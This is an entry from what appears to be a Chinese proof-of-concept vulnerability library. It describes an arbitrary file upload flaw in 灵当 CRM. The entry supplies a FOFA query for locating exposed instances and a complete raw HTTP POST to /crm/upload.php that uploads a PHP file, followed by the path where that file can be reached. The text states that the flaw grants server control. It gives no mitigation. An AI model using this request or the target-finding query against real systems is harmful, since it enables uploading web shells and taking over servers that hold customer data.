---
fofa: "body="
source: "wy876 漏洞文库"
---

# 灵当crm upload存在任意文件上传漏洞

# 一、漏洞简介
灵当CRM 是一款企业级客户关系管理软件。它旨在帮助企业管理客户信息、销售流程、市场营销活动和客户服务等。灵当crm存在任意文件上传漏洞，攻击者可以通过该漏洞写入恶意文件获取服务器权限。

# 二、影响版本
+ 灵当crm

# 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"`
+ 特征


# 四、漏洞复现
```plain
POST /crm/upload.php HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----234561
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 149

------234561
Content-Disposition: form-data; name="file"; filename="aa.php"
Content-Type: application/octet-stream

234561
------234561--
```


```plain
/crm/recordData/20240824/aa.php
其中20240824为当前时间
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ilggltsrlmmqkw8h>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
